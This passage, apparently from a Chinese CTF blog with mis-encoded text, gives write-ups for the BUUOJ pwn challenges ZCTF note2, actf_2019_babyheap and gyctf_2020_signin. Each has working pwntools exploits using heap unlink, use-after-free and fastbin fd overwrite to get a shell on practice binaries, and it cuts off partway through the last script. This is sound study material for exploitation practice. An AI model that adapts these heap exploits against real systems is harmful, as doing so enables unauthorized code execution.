class=""><p>æ‰€ä»¥æ‰§è¡Œæµç¨‹æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc â€”&gt; __malloc_hook â€”&gt; realloc â€”&gt; __realloc_hook â€”&gt; one_gadget --&gt;getshell</span><br></pre></td></tr></table></figure><p>å®é™…çš„æ“ä½œä¸­è¿˜æ˜¯å»è¯•åç§»ä¼šå¿«ä¸€ç‚¹â€¦.</p><h3 id="2016-ZCTF-note2"><a href="#2016-ZCTF-note2" class="headerlink" title="2016 ZCTF note2"></a>2016 ZCTF note2</h3><h4 id="0x00-åŸºæœ¬ä¿¡æ¯-1"><a href="#0x00-åŸºæœ¬ä¿¡æ¯-1" class="headerlink" title="0x00 åŸºæœ¬ä¿¡æ¯"></a>0x00 åŸºæœ¬ä¿¡æ¯</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/5.png" class=""><p>å¯ä»¥å†™GOTè¡¨â€¦</p><h4 id="0x01-IDAåˆ†æ-1"><a href="#0x01-IDAåˆ†æ-1" class="headerlink" title="0x01 IDAåˆ†æ"></a>0x01 IDAåˆ†æ</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/6.png" class=""><p>ç»å…¸èœå•é¢˜ï¼Œä¸€ä¸ªå‡½æ•°ä¸€ä¸ªå‡½æ•°çœ‹å§ï¼</p><h5 id="addå‡½æ•°"><a href="#addå‡½æ•°" class="headerlink" title="addå‡½æ•°"></a>addå‡½æ•°</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/image-20210818154940988.png" class=""><p>åˆ†é…noteçš„æ•°é‡é™åˆ¶åœ¨4ä¸ªä»¥å†…ï¼Œå¤§å°é™åˆ¶ä¸º0x80ä»¥å†…ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯å®ƒæ²¡æœ‰é™åˆ¶å †å—çš„å¤§å°ä¸ä¸º0ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è¯»å…¥content</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/7.png" class=""><p>åˆšåˆšè¯´åˆ°å®ƒæ²¡æœ‰é™åˆ¶å †å—å¤§å°ä¸º0ï¼Œé‚£ä¹ˆå½“sizeä¹Ÿå°±æ˜¯a2ä¸º0çš„æ—¶å€™ï¼Œa2 - 1 = -1ï¼Œä¸æ— ç¬¦å·å˜é‡iè¿›è¡Œå¯¹æ¯”çš„æ—¶å€™ï¼Œ-1å°†è½¬åŒ–æˆæœ€å¤§çš„æ— ç¬¦å·æ•°ï¼Œé‚£ä¹ˆå°±å¯ä»¥å®ç°æº¢å‡ºäº†</p><p>é™¤æ­¤ä¹‹å¤–ï¼Œç¨‹åºè¿˜ç»´æŠ¤äº†ä¸€å¼ å †å—çš„ä¿¡æ¯è¡¨ï¼Œä¸€çœ‹åˆ°è¿™ç¬¬ä¸€ååº”è‚¯å®šæ˜¯åŠ«æŒè¿™ä¸ªå †å—è¡¨</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/8.png" class=""><h5 id="showå‡½æ•°"><a href="#showå‡½æ•°" class="headerlink" title="showå‡½æ•°"></a>showå‡½æ•°</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/9.png" class=""><p>æ²¡å•¥æ¯›ç—…ï¼Œåœ¨pträ¸­æœ‰è®°å½•æ­¤å †å—çš„å†…å®¹æŒ‡é’ˆï¼Œå°±æ‰“å°å‡ºæ¥</p><h5 id="editå‡½æ•°"><a href="#editå‡½æ•°" class="headerlink" title="editå‡½æ•°"></a>editå‡½æ•°</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/10.png" class=""><h5 id="deleteå‡½æ•°"><a href="#deleteå‡½æ•°" class="headerlink" title="deleteå‡½æ•°"></a>deleteå‡½æ•°</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/11.png" class=""><p>freeæ‰ä¹‹åæ¸…é›¶äº†ï¼Œä¸å­˜åœ¨uafï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯åŠ«æŒåˆšåˆšçš„å †å—è¡¨ï¼Œè¿™é‡Œæ²¡æœ‰uafï¼Œå †å—å¤§å°ä¹Ÿé™åˆ¶äº†ï¼Œè€ƒè™‘ç”¨unlink</p><h4 id="0x02-è§£é¢˜æ€è·¯-1"><a href="#0x02-è§£é¢˜æ€è·¯-1" class="headerlink" title="0x02 è§£é¢˜æ€è·¯"></a>0x02 è§£é¢˜æ€è·¯</h4><p>1.å¸ƒç½®å †é£æ°´ï¼Œä¸ºunlinkåšé“ºå«</p><p>2.unlinkä½¿å¾—ptr[0] = ptr[0] - 0x18</p><p>3.ä¿®æ”¹å †æŒ‡é’ˆä¸ºatoi@gotï¼Œshowå®ƒæ³„éœ²libcåœ°å€</p><p>4.ä¿®æ”¹atoi@gotä¸ºsystem@got</p><h4 id="0x03-å®Œæ•´EXP-1"><a href="#0x03-å®Œæ•´EXP-1" class="headerlink" title="0x03 å®Œæ•´EXP"></a>0x03 å®Œæ•´EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;note2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary = <span class="string">&#x27;note2&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;25066&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Input the length of the note content:(less than 128)&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Input the note content:&#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,chioce,content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Input the id of the note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;do you want to overwrite or append?[1.overwrite/2.append]&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(chioce))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Input the id of the note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Input the id of the note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Input your name:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;zyen&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Input your address:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x602120</span></span><br><span class="line">fake_fd = ptr - <span class="number">0x18</span></span><br><span class="line">fake_bk = ptr - <span class="number">0x10</span></span><br><span class="line">fake_content0 = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0xa1</span>)+p64(fake_fd)+p64(fake_bk)</span><br><span class="line">add(<span class="number">0x80</span>,fake_content0)</span><br><span class="line">add(<span class="number">0x0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0xa0</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x0</span>,payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(atoi_got)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;is &quot;</span>)</span><br><span class="line"></span><br><span class="line">atoi_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;atoi_addr : &#x27;</span> + <span class="built_in">hex</span>(atoi_addr)</span><br><span class="line"></span><br><span class="line">libc_base = atoi_addr - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr : &#x27;</span> + <span class="built_in">hex</span>(system_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,p64(system_addr))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="0x04-æ€»ç»“-1"><a href="#0x04-æ€»ç»“-1" class="headerlink" title="0x04 æ€»ç»“"></a>0x04 æ€»ç»“</h4><h5 id="1-unlinkæ³¨æ„äº‹é¡¹"><a href="#1-unlinkæ³¨æ„äº‹é¡¹" class="headerlink" title="1.unlinkæ³¨æ„äº‹é¡¹"></a>1.unlinkæ³¨æ„äº‹é¡¹</h5><p>åˆšå¼€å§‹å¯¹è¿™ä¸ªpayloadåŒªå¤·æ‰€æ€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0xa0</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x0</span>,payload)</span><br></pre></td></tr></table></figure><p><strong>å‘ååˆå¹¶</strong>çš„æºç å¦‚ä¸‹</p><ul><li><p>æˆ‘ä»¬å‘ç°å®ƒé¦–å…ˆä¼šåˆ¤æ–­<strong>prev_inuse</strong>æ˜¯å¦ä¸º0ï¼Œè€Œåœ¨æ­¤é¢˜ç›®ä¸­çš„å †å—æ˜¯fastbinèŒƒç•´çš„å †å—ï¼Œæ‰€ä»¥å½“å®ƒè¢«freeçš„æ—¶å€™å¹¶ä¸ä¼šæŠŠ<strong>prev_inuse</strong>ç½®ä¸º0ï¼Œéœ€è¦æˆ‘ä»¬æ‰‹åŠ¨ç½®é›¶</p></li><li><p>å°†<strong>prev_size</strong>æ‹¿å‡ºæ¥åŠ ä¸Šå®ƒæœ¬æ¥çš„å¤§å°å˜æˆå®ƒunlinkç»“æŸä¹‹åå †å—çš„å¤§å°</p></li><li><p>æ ¹æ®å½“å‰çš„chunkçš„<strong>prev_size</strong>æ¥è·å–åˆ°å‰ä¸€ä¸ªå †å—çš„æŒ‡é’ˆï¼ˆè¿™é‡Œçš„å‘ååˆå¹¶å…¶å®æ˜¯å‘ä½åœ°å€åˆå¹¶</p></li><li><p>å¼€å§‹unlink~</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line"></span><br><span class="line">    prevsize = prev_size (p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ—¢ç„¶å¤ä¹ åˆ°å‘ååˆå¹¶ï¼Œé‚£å°±â€¦</p><p><strong>å‘å‰åˆå¹¶</strong>çš„æºç </p><p>å’Œå‘ååˆå¹¶ç›¸æ¯”ï¼Œå‘å‰åˆå¹¶çš„æºç å°±ç®€å•ä¸€äº›</p><ul><li>å…ˆä¼šåˆ¤æ–­æ˜¯ä¸æ˜¯å’Œtop chunkç›¸é‚»ï¼Œç›¸é‚»å°±åˆå¹¶äº†</li><li>å¦‚æœnextinuseæ˜¯1å°±ä¿®æ”¹å®ƒçš„prev_inuseä¸º0</li><li>unlinkå®Œäº‹ä¹‹åæŠŠsizeæ”¹ä¸ºåˆå¹¶åçš„size</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top)&#123;</span><br><span class="line">    <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">        unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        size += nextsize;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        size += nextsize;</span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        av-&gt;top = p;</span><br><span class="line">        check_chunk(av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="actf-2019-babyheap"><a href="#actf-2019-babyheap" class="headerlink" title="actf_2019_babyheap"></a>actf_2019_babyheap</h3><h4 id="0x00-åŸºæœ¬ä¿¡æ¯-2"><a href="#0x00-åŸºæœ¬ä¿¡æ¯-2" class="headerlink" title="0x00 åŸºæœ¬ä¿¡æ¯"></a>0x00 åŸºæœ¬ä¿¡æ¯</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/14.png" class=""><h4 id="0x01-IDAåˆ†æ-2"><a href="#0x01-IDAåˆ†æ-2" class="headerlink" title="0x01 IDAåˆ†æ"></a>0x01 IDAåˆ†æ</h4><p>å…ˆçœ‹çœ‹freeå‡½æ•°</p><h5 id="freeå‡½æ•°"><a href="#freeå‡½æ•°" class="headerlink" title="freeå‡½æ•°"></a>freeå‡½æ•°</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/15.png" class=""><p>ç»å…¸uaf</p><h5 id="createå‡½æ•°"><a href="#createå‡½æ•°" class="headerlink" title="createå‡½æ•°"></a>createå‡½æ•°</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/16.png" class=""><p>ç»å…¸ä¹‹ä¸èƒ½å†ç»å…¸</p><h5 id="printå‡½æ•°"><a href="#printå‡½æ•°" class="headerlink" title="printå‡½æ•°"></a>printå‡½æ•°</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/16.jpg" class=""><p>ç•™äº†ä¸€ä¸ªåé—¨å‡½æ•°ï¼Œç›´æ¥æ‰§è¡Œå†…å®¹ï¼Œåœ¨åˆå§‹åŒ–çš„æ—¶å€™æˆ‘ä»¬çœ‹åˆ°äº†systemå‡½æ•°</p><h4 id="0x02-è§£é¢˜æ€è·¯-2"><a href="#0x02-è§£é¢˜æ€è·¯-2" class="headerlink" title="0x02 è§£é¢˜æ€è·¯"></a>0x02 è§£é¢˜æ€è·¯</h4><h4 id="0x03-å®Œæ•´EXP-2"><a href="#0x03-å®Œæ•´EXP-2" class="headerlink" title="0x03 å®Œæ•´EXP"></a>0x03 å®Œæ•´EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;ACTF_2019_babyheap&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26654</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;ACTF_2019_babyheap&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,payload</span>):</span>                                    </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)                    </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Please input size: \n&quot;</span>,<span class="built_in">str</span>(size))      </span><br><span class="line">    io.sendafter(<span class="string">&quot;Please input content: \n&quot;</span>,payload)         </span><br><span class="line">                                                             </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span>                                           </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="string">&#x27;2&#x27;</span>)                    </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Please input list index: \n&quot;</span>,<span class="built_in">str</span>(index)) </span><br><span class="line">                                                             </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_this</span>(<span class="params">index</span>):</span>                                       </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="string">&#x27;3&#x27;</span>)                    </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Please input list index: \n&quot;</span>,<span class="built_in">str</span>(index)) </span><br><span class="line"></span><br><span class="line">create(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10</span>,p64(<span class="number">0x602010</span>) + p64(elf.symbols[<span class="string">&quot;system&quot;</span>]))<span class="comment">#0x602010æ˜¯/bin/sh</span></span><br><span class="line">print_this(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="gyctf-2020-signin"><a href="#gyctf-2020-signin" class="headerlink" title="gyctf_2020_signin"></a>gyctf_2020_signin</h3><h4 id="0x00-åŸºæœ¬ä¿¡æ¯-3"><a href="#0x00-åŸºæœ¬ä¿¡æ¯-3" class="headerlink" title="0x00 åŸºæœ¬ä¿¡æ¯"></a>0x00 åŸºæœ¬ä¿¡æ¯</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/17.png" class=""><p>é¢˜ç›®æè¿°æ˜¯åœ¨ubuntu18é‡Œé¢çš„ï¼Œæ‰€ä»¥æœ‰tacheæœºåˆ¶</p><h4 id="0x01-IDAåˆ†æ-3"><a href="#0x01-IDAåˆ†æ-3" class="headerlink" title="0x01 IDAåˆ†æ"></a>0x01 IDAåˆ†æ</h4><h5 id="delå‡½æ•°"><a href="#delå‡½æ•°" class="headerlink" title="delå‡½æ•°"></a>delå‡½æ•°</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/18.png" class=""><p>è™½ç„¶æŠŠflagsæ¸…é›¶äº†ï¼Œä½†æ˜¯ptrlistæ²¡æœ‰æ¸…é›¶</p><h5 id="addå‡½æ•°-1"><a href="#addå‡½æ•°-1" class="headerlink" title="addå‡½æ•°"></a>addå‡½æ•°</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/19.png" class=""><p>åªèƒ½åˆ†é…0xFä¸ªchunkï¼Œæœ‰ä¸ªptrlistå­˜åœ¨bssæ®µä¸Š</p><h5 id="editå‡½æ•°-1"><a href="#editå‡½æ•°-1" class="headerlink" title="editå‡½æ•°"></a>editå‡½æ•°</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/20.png" class=""><p>cntæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå€¼ä¸º1ï¼Œæ‰€ä»¥editå‡½æ•°åªèƒ½eaitä¸€æ¬¡ï¼Œä¸€å¼€å§‹æƒ³åŠ«æŒtacheä¸è¿‡åªèƒ½åªèƒ½editä¸€æ¬¡</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/21.jpg" class=""><h5 id="åé—¨å‡½æ•°"><a href="#åé—¨å‡½æ•°" class="headerlink" title="åé—¨å‡½æ•°"></a>åé—¨å‡½æ•°</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/22.png" class=""><p>callocä¸€ä¸‹å°±åˆ¤æ–­ptrçš„å€¼æ˜¯å¦ä¸º0ï¼Œä¸ä¸º0å°±èµ·ä¸€ä¸ªshellï¼Œptræ˜¯bssæ®µä¸Šçš„ä¸€ä¸ªå˜é‡</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/23.jpg" class=""><h4 id="0x02è§£é¢˜æ€è·¯"><a href="#0x02è§£é¢˜æ€è·¯" class="headerlink" title="0x02è§£é¢˜æ€è·¯"></a>0x02è§£é¢˜æ€è·¯</h4><ol><li>åˆ†é…8ä¸ªchunkå¹¶freeæ‰ï¼Œä¼šæœ‰ä¸€ä¸ªchunkè¿›å…¥fastbin</li><li>addå›æ¥ä¸€ä¸ªchunk</li><li>ä¿®æ”¹fastbinä¸­çš„å †å—çš„fd</li><li>æ‰§è¡Œåé—¨å‡½æ•°</li></ol><h4 id="0x03-å®Œæ•´EXP-3"><a href="#0x03-å®Œæ•´EXP-3" class="headerlink" title="0x03 å®Œæ•´EXP"></a>0x03 å®Œæ•´EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;gyctf_2020_signin&#x27;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary = <span class="string">&#x27;gyctf_2020_signin&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;26743&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span 